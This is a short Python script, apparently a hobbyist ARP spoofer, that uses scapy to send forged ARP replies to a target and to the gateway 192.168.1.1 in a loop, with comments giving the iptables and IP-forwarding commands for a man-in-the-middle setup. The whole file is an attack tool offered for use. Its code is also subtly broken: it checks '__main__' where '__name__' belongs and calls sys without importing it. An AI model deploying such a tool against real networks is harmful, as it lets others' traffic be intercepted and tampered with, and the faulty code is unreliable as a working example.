#!/usr/bin/env python3

# 1. iptables --policy FORWARD ACCEPT 
# 2. echo 1 > /proc/sys/net/ipv4/ip_forward

import argparse
import time
import scapy.all as scapy
from termcolor import colored
import signal

def close_application(sig, frame):
    print(colored("[-] Closing application...", "red"))
    sys.exit(1)

signal.signal(signal.SIGINT, close_application)

def get_args():
    parser = argparse.ArgumentParser(description='ARP Spoofer')
    parser.add_argument("-t", "--target", dest="target", required=True, help="Target host or IP range to spoof")
    return parser.parse_args()

def spoof(ip_address, spoof_ip):
    arp_packet = scapy.ARP(op=2, psrc=spoof_ip, pdst=ip_address, hwsrc="aa:bb:cc:44:55:66")
    scapy.send(arp_packet, verbose=False)


if __main__ == '__main__':
    args = get_args()
    while True:
        spoof(args.target, "192.168.1.1")
        spoof("192.168.1.1", args.target)

        time.sleep(2)